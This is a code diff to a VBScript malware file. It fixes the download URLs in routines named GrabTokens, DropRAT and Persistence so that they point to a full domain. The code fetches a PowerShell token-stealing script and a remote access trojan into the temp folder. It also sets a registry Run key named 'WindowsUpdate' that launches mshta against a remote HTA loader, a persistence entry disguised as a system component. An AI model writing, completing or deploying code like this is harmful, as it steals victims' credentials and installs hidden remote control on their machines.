@@ -209,7 +209,7 @@ Sub GrabTokens()
     Dim psf: psf = sh.ExpandEnvironmentStrings("%TEMP%") & "\steal.ps1"
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
-    xh.Open "GET", "https://dicerigs/steal.ps1", False
+    xh.Open "GET", "https://dicerigs.app/steal.ps1", False
     xh.Send
     If xh.Status <> 200 Then Exit Sub
     Dim f: Set f = fso.CreateTextFile(psf, True): f.Write xh.responseText: f.Close
@@ -248,7 +248,7 @@ Sub GrabTokens_REG()
     Dim psf: psf = sh.ExpandEnvironmentStrings("%TEMP%") & "\steal.ps1"
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
-    xh.Open "GET", "https://dicerigs/steal.ps1", False
+    xh.Open "GET", "https://dicerigs.app/steal.ps1", False
     xh.Send
     If xh.Status <> 200 Then Exit Sub
     Dim f: Set f = fso.CreateTextFile(psf, True): f.Write xh.responseText: f.Close
@@ -284,7 +284,7 @@ Sub GrabTokens_REG()
 End Sub
 
 Sub DropRAT()
-    Dim dl : dl = "https://dicerigs/agent.exe"
+    Dim dl : dl = "https://dicerigs.app/agent.exe"
     Dim op : op = sh.ExpandEnvironmentStrings("%TEMP%") & "\agent.exe"
     If fso.FileExists(op) Then fso.DeleteFile op
 
@@ -309,7 +309,7 @@ Sub DropRAT()
 End Sub
 
 Sub Persistence()
-    Dim payload : payload = "mshta https://dicerigs"
+    Dim payload : payload = "mshta https://dicerigs.app/loader.hta"
     On Error Resume Next
 
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", payload, "REG_SZ"
